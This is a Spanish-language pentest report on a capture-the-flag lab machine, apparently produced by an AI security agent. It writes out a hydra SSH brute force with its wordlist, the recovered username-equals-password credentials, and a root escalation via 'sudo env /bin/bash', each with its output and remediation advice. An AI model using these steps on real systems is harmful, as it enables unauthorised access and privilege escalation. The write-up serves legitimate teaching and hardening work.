# Reporte de Auditoría de Seguridad — LegacyBughunter

| **Fecha de la auditoría** | 17 de noviembre de 2026 |
| **Objetivo** | `http://172.17.0.2/` |
| **Tipo de evaluación** | Hacking ético / pentest autorizado en entorno de laboratorio |
| **Auditor** | Agente de seguridad (OpenCode) |
| **Superficie evaluada** | Red, servicios TCP, aplicación web, sistema operativo y privilegios |
| **Resultado global** | **CRÍTICO** — compromiso total del host (root) y obtención del flag |

---

## 1. Resumen ejecutivo

La evaluación del activo `172.17.0.2` determinó que el sistema es **vulnerable a un compromiso completo remoto**. Se identificaron tres debilidades encadenadas que permitieron pasar de un acceso anónimo desde la red a **ejecución de comandos con privilegios de superusuario (root)**:

1. **Credenciales débiles y predecibles en el servicio SSH**, explotables mediante fuerza bruta con un diccionario muy pequeño (14 palabras). Se obtuvieron tres cuentas válidas: `legacy`, `flynn` y `tron`.
2. **Exposición pública de un binario COBOL con información sensible embebida** en el servidor web (`/legacy`). El archivo conserva símbolos de depuración y contiene, en texto plano, la lógica de validación y el flag del laboratorio.
3. **Configuración peligrosa de `sudo`**: el usuario `legacy` puede ejecutar `/usr/bin/env` como root sin contraseña (`NOPASSWD`), lo que permite evadir `secure_path` y escalar a root de forma inmediata (técnica GTFOBins).

**Flag del laboratorio:** `DL{ningun sistema es seguro}`

---

## 2. Alcance y metodología

### 2.1 Alcance
- Dirección IP: `172.17.0.2`.
- Puertos expuestos: TCP/22 (SSH), TCP/80 (HTTP).

### 2.2 Metodología
Se siguió un enfoque de "caja negra" con verificación posterior desde el propio host:

| Fase | Herramientas / acciones |
|---|---|
| Descubrimiento | `ping`, `ip addr` |
| Escaneo de puertos y servicios | `nmap -sS -sC -sV -p-` |
| Enumeración web | `gobuster dir` con `raft-large-directories-lowercase.txt`, `curl` |
| Análisis de artefactos web | `file`, `exiftool`, `strings`, ejecución controlada del binario |
| Explotación de accesos | `hydra` sobre SSH con `legacy_pass.txt` |
| Post-explotación | `paramiko` (SSH automatizado), enumeración de usuarios, `sudo -l` |
| Escalada de privilegios | `sudo env /bin/bash` (GTFOBins) |
| Búsqueda de evidencia | `find`, `grep`, lectura de flags |

---

## 3. Hallazgos

### 3.1 Tabla resumen

| ID | Hallazgo | Severidad | CVSS v3.1 estimado | Estado |
|---|---|---|---|---|
| LBH-01 | Credenciales débiles en SSH (fuerza bruta exitosa) | **Crítico** | 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | Explotado |
| LBH-02 | Escalada a root mediante `sudo env` (NOPASSWD) | **Crítico** | 7.8 (`AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | Explotado |
| LBH-03 | Exposición de binario con credenciales y flag en claro | **Alto** | 7.5 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`) | Explotado |
| LBH-04 | Ausencia de limitación de intentos de autenticación | **Medio** | 5.3 (`AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`) | Confirmado |
| LBH-05 | Divulgación de versión de software en cabeceras HTTP | **Bajo** | 3.7 (`AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N`) | Confirmado |

---

### 3.2 LBH-01 — Credenciales débiles en SSH (Crítico)

**Descripción.** El servicio OpenSSH 8.9p1 permitió autenticación por contraseña con cuentas cuyo usuario y contraseña coinciden. No se observó bloqueo, CAPTCHA ni retardo progresivo tras múltiples intentos fallidos.

**Evidencia.**

# Escaneo inicial

```bash
sudo nmap -sS -sC -sV -p 22 172.17.0.2
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 17:d2:08:7a:48:72:ef:08:81:65:d5:5d:24:0a:11:6c (ECDSA)
|_  256 ae:fe:d7:ef:5b:35:dd:0b:f3:ff:82:2f:c6:78:19:b6 (ED25519)
```

# Fuerza bruta con diccionario del universo de Tron

```bash
vi legacy_pass.txt
```

```text
kevin
sam
flynn
alan
bradley
edward
tron
clu
quorra
master
sark
castor
rinzler
legacy
```

```bash
hydra -l legacy -P legacy_pass.txt ssh://172.17.0.2 -I -f

hydra -l flynn -P legacy_pass.txt ssh://172.17.0.2 -I -f

hydra -l tron -P legacy_pass.txt ssh://172.17.0.2 -I -f
```

```text
[22][ssh] host: 172.17.0.2 login: legacy password: legacy
[22][ssh] host: 172.17.0.2 login: flynn  password: flynn
[22][ssh] host: 172.17.0.2 login: tron   password: tron
```

**Impacto.** Acceso remoto inicial como usuario del sistema. Cualquier atacante con conectividad al puerto 22 podía replicar el ataque en segundos.

**Recomendación.**
- Deshabilitar autenticación por contraseña (`PasswordAuthentication no`) y usar exclusivamente claves SSH.
- Forzar contraseñas largas y únicas si no se puede prescindir de ellas.
- Implementar MFA para accesos administrativos.
- Aplicar limitación de tasa con `fail2ban` o `sshguard`.

---

### 3.3 LBH-02 — Escalada de privilegios vía `sudo env` (Crítico)

**Descripción.** El usuario `legacy` tenía una regla `sudo` explícitamente permisiva:

```text
legacy@9b4f9d290d5a:~$ sudo -l
Matching Defaults entries for legacy on 9b4f9d290d5a:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User legacy may run the following commands on 9b4f9d290d5a:
    (ALL) NOPASSWD: /usr/bin/env
legacy@9b4f9d290d5a:~$
```

`env` permite especificar el ejecutable a lanzar y manipular el entorno, por lo que bypassa el `secure_path` y cualquier restricción. Es una técnica documentada en GTFOBins.

**Evidencia (prueba de concepto).**
```text
legacy@9b4f9d290d5a:~$ sudo env /bin/bash
root@9b4f9d290d5a:/home/legacy# id
uid=0(root) gid=0(root) groups=0(root)
root@9b4f9d290d5a:/home/legacy# whoami
root
root@9b4f9d290d5a:/home/legacy# hostname
9b4f9d290d5a
root@9b4f9d290d5a:/home/legacy#
```

**Impacto.** Compromiso total: lectura/escritura de cualquier archivo, creación de usuarios, instalación de rootkits, acceso a `/root`, etc.

**Recomendación.**
- Eliminar la regla `NOPASSWD` para `/usr/bin/env` inmediatamente.
- Aplicar principio de mínimo privilegio: solo comandos específicos y con `NOPASSWD` justificado.
- Auditar `/etc/sudoers` y `/etc/sudoers.d/` periódicamente.
- Monitorizar ejecuciones de `sudo env`, `sudo find`, `sudo nmap`, etc. (binarios GTFOBins).

---

### 3.4 LBH-03 — Binario COBOL expuesto con secretos en claro (Alto)

**Descripción.** El servidor web sirve `/legacy`, un ELF de 77 KB compilado en COBOL con información de depuración (`not stripped`). El binario contiene:

- Cadena `hacker` como credencial válida.
- Mensaje `[+] Esta historia continua.`
- Flag `DL{ningun sistema es seguro}` en texto plano.
- Ruta de compilación `/tmp/legacy.cbl`.

**Evidencia.**
```text
$ curl -sS http://172.17.0.2/legacy -o legacy_dl
$ file legacy_dl
ELF 64-bit LSB pie executable, ... with debug_info, not stripped

$ strings legacy_dl | grep -iE 'flag|hacker'
hacker
Flag: DL{ningun sistema es seguro}
/tmp/legacy.cbl

# Ejecución controlada dentro del contenedor
$ printf 'hacker\nhacker\n' | ./legacy
[+] Esta historia continua.
Flag: DL{ningun sistema es seguro}
```

Además, la página principal filtra el mensaje: *"todos los archivos estan ocultos hacker ninguno sistema es seguro"*, que actúa como pista.

```bash
curl -s http://172.17.0.2/
```

```text
<html><head><style>body { background-image: url("legacy.png"); background-size: cover; background-position: center; color: #00ffcc; font-family: monospace; text-align: center; padding-top: 15%; background-attachment: fixed; margin: 0; height: 100vh; } h1 { font-size: 5em; text-transform: uppercase; letter-spacing: 10px; text-shadow: 0 0 20px #00ffcc, 0 0 40px #00a3ff; margin-bottom: 5px; } p { font-size: 1.6em; text-shadow: 0 0 8px #00ffcc; letter-spacing: 2px; }</style></head><body><h1>legacy</h1><p>todos los archivos estan ocultos hacker ninguno sistema es seguro</p></body></html>
```

**Impacto.** Divulgación de secretos y lógica interna sin autenticación. En un sistema real, este tipo de artefactos suele revelar contraseñas, claves API o rutas internas.

**Recomendación.**
- Retirar archivos ejecutables del `DocumentRoot` (`/var/www/html`).
- Compilar con `-s` (stripped) y sin información de depuración en producción.
- Nunca embeber credenciales ni flags en binarios distribuidos.
- Revisar permisos: el archivo tenía modo `0755` y era servido por Apache.

---

### 3.5 LBH-04 — Ausencia de limitación de intentos (Medio)

**Descripción.** Hydra completó 14 intentos sobre `legacy`, y posteriormente sobre `flynn` y `tron`, sin que el servicio aplicara bloqueo por IP ni retardo. Esto amplifica LBH-01.

**Evidencia.** Los tres ataques terminaron con `valid password found` en menos de un minuto cada uno.

**Recomendación.** Configurar `MaxAuthTries`, `LoginGraceTime` y `fail2ban` (e.g., 3 intentos → ban de 10 minutos).

---

### 3.6 LBH-05 — Divulgación de versiones (Bajo)

**Descripción.** Las cabeceras HTTP y el banner SSH revelan versiones exactas:

```bash
sudo nmap -sS -sC -sV -p 80 172.17.0.2
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

**Impacto.** Facilita al atacante seleccionar exploits conocidos. En este laboratorio las versiones parecen parcheadas, por lo que el riesgo es informativo.

**Recomendación.** Ocultar banners (`ServerTokens Prod`, `ServerSignature Off`, `DebianBanner no` en SSH) y mantener parches aplicados.

---

## 4. Cadena de ataque (kill chain)

```text
[Reconnaissance]
  nmap -p- → 22/tcp, 80/tcp
        │
        ▼
[Enumeration]
  gobuster → /legacy (ELF COBOL), /legacy.png, /server-status (403)
  strings /legacy → pista "hacker", flag DL{...}
        │
        ▼
[Initial Access]
  hydra SSH → legacy:legacy, flynn:flynn, tron:tron
        │
        ▼
[Discovery]
  sudo -l → (ALL) NOPASSWD: /usr/bin/env
        │
        ▼
[Privilege Escalation]
  sudo env /bin/bash → uid=0(root)
        │
        ▼
[ objectives ]
  Ejecución de comandos arbitrarios como root + flag obtenida
```

**Credenciales comprometidas:** `legacy:legacy`, `flynn:flynn`, `tron:tron`.
**Flag:** `DL{ningun sistema es seguro}`.

---

## 5. Recomendaciones priorizadas

| Prioridad | Acción | Plazo sugerido |
|---|---|---|
| P0 | Eliminar la regla `NOPASSWD: /usr/bin/env` y auditar sudoers | Inmediato |
| P0 | Rotar las tres contraseñas comprometidas y deshabilitar login por-password en SSH | Inmediato |
| P1 | Retirar `/legacy` del servidor web y eliminar símbolos de depuración | 24 h |
| P1 | Desplegar `fail2ban` / limitación de intentos en SSH | 24 h |
| P2 | Ocultar banners de Apache y OpenSSH | 1 semana |
| P2 | Revisar permisos de directorios home (`0750` observado, correcto) y archivos del webroot | 1 semana |
| P3 | Implementar monitorización de `sudo` y accesos SSH (auditd / SIEM) | 1 mes |

---

## 6. Conclusión

El laboratorio **LegacyBughunter** fue comprometido completamente en approximately 10 minutos mediante una cadena de debilidades elementales pero críticas: contraseñas triviales, falta de control de intentos, exposición de secretos en un binario web y una regla sudo excesivamente permisiva.

El hallazgo más relevante desde el punto de vista ejecutivo es que **una sola debilidad (credenciales débiles) fue suficiente para entrar, y una segunda (sudo mal configurado) convirtió ese acceso en control total del sistema**. Esto ilustra la importancia de aplicar defensa en profundidad: incluso si el atacante consigue un pie en la red, la escalada debe ser imposible.

---

## Apéndice A — Comandos ejecutados (evidencia)

```bash
# Reconocimiento
nmap -sS -sC -sV -p- 172.17.0.2
gobuster dir -u http://172.17.0.2/ -w raft-large-directories-lowercase.txt -t 32 -x php,html,txt,zip,png
curl -sS -i http://172.17.0.2/

# Análisis del artefacto web
file legacy_dl
exiftool legacy.png
strings legacy_dl | grep -iE 'flag|hacker'

# Explotación
hydra -l legacy -P legacy_pass.txt ssh://172.17.0.2 -I -f
sudo -l
sudo env /bin/bash -c "id; whoami; ls -la /home/legacy"
printf 'hacker\nhacker\n' | /var/www/html/legacy
```

## Apéndice B — Reto Cyber

```bash
# Archivo oculto en legacy
ls -la /home/legacy
./.reto_cyber.sh
Tiempo restante: 114 segundos | Introduce la contraseña: hacker
[P1] ¿Ya encontraste las maquinas Flynn y Tron? (s/n) [90s]: s (solo si has encontrado las maquinas Flynn y Tron)
[P2] ¿Cuantos puertos tiene abiertos legacybunhunter? (2/3) [59s]: 3
[P3] ¿Eres hacker o cracker? (Escribe la palabra completa y presiona Enter)
hacker

ya eres root

=========================================
   ESTA HISTORIA CONTINUA HACKER
=========================================
```

## Apéndice C — Ficheros ocultos

```bash
# Ficheros ocultos en los usuario legacy, flynn y tron
ls -la /home/legacy
cat .desconectate.txt 
"Desconéctate. Sal del sistema." — Una premisa constante en la actitud de Kevin Flynn, quien prefiere el aislamiento antes de permitir que su creación escape al mundo real.

ls -la /home/flynn
cat .sistema_perfecto.txt 
¡Yo creé el sistema perfecto!" — CLU, expresando su fanatismo por eliminar cualquier error o imperfección en La Red

ls -la /home/tron
cat .mundo_imperfecto.txt 
¿Qué más imperfecto que nuestro mundo?" — Kevin Flynn, reflexionando sobre la belleza de lo real frente a la fría y rígida utopía digital que intentó construir.
```

## Apéndice D — Indicadores de compromiso (IoC)

- IP objetivo: `172.17.0.2`
- Usuarios implicados: `legacy`, `flynn`, `tron`
- Archivos sensibles: `/var/www/html/legacy`, `/home/legacy/.reto_cyber.sh`
- Flag: `DL{ningun sistema es seguro}`
- binario con debug_info: BuildID `1be0b801903df9a4f53a807441d5e756bc373f34`
